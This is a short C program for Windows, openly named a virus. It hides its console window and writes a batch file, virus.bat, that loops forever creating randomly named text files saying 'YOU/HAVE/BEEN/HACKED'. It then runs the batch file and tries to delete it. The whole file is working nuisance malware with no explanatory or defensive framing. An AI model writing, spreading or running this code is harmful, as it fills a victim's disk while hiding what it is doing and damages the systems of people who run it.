#include <stdio.h>
#include <windows.h>
#define PATH "virus.bat"

int main()
{
    HWND window;
    AllocConsole();
    window = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(window, 0);

    FILE *a = fopen("virus.bat", "ab+");
    fclose(a);

    FILE *fp;

    fp = fopen(PATH, "w");
    fprintf(fp, "echo off\n:start\necho YOU/HAVE/BEEN/HACKED>sshtunneldecryption\%%random\%%\.txt\ngoto start");

    fclose(fp);

    system(PATH);
    Sleep(10);
    remove(PATH);
    return 0;
}
